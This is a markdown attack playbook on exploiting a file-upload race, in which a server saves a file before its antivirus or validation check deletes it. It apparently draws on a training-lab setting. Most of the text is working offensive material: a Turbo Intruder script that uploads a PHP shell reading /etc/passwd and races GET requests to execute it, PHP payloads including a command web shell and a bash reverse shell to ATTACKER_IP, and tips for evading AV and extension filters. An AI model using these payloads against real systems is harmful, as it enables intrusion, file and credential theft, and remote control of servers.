# File Upload Race (Validation / AV Bypass)

## When this applies

- Upload endpoint saves the file to its serving directory FIRST and runs validation/AV scan AFTER.
- File is reachable via HTTP between the save and the deletion (if validation rejects it).
- Goal: upload a malicious file, then race repeated GETs against the post-upload deletion.

## Technique

Upload the malicious file in one request, fire 5+ GETs to the upload URL with the same gate. One GET will land in the window between save and delete and serve the file, granting RCE / file read.

**Vulnerable Code:**
```python
save_file(upload)
scan_result = antivirus.scan(upload)
if scan_result.malicious:
    delete_file(upload)
```

**Attack Pattern:**
```
Parallel:
  - POST /upload (malicious file)
  - GET /uploads/file (5 times)
```

**Success Signature:** One GET returns 200 with file contents; others return 404 (file deleted).

## Steps

### Turbo Intruder script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=100
    )

    # Upload malicious file
    uploadReq = '''POST /upload HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/etc/passwd'); ?>
------WebKitFormBoundary--

'''

    # Execute file before deletion
    executeReq = '''GET /uploads/shell.php HTTP/2
Host: target.com

'''

    engine.queue(uploadReq, gate='race1')
    for i in range(5):
        engine.queue(executeReq, gate='race1')

    engine.openGate('race1')
```

### PHP payloads

```php
<!-- Read file -->
<?php echo file_get_contents('/home/carlos/secret'); ?>

<!-- Command execution -->
<?php system($_GET['cmd']); ?>

<!-- Directory listing -->
<?php echo implode("\n", scandir('/home')); ?>

<!-- Reverse shell -->
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

## Verifying success

- One of the GET responses contains the rendered file output (e.g., `/etc/passwd` content).
- Other GETs return 404 — confirming the file was deleted shortly after.
- Re-running the attack reproduces the success rate.

## Common pitfalls

- Some servers serve static files via a separate process (nginx) that doesn't see the deletion immediately — the GET window can be larger than expected.
- AV scanners may block the upload entirely (no save) — try non-AV-flagged payloads (e.g., `<?=` short tags, base64 inside an image).
- File extensions matter: `.php` may be rewritten or denied; try `.phtml`, `.php5`, `.phar`.

## Tools

- Burp Turbo Intruder
- Burp Repeater
- Burp Collaborator (out-of-band confirmation)
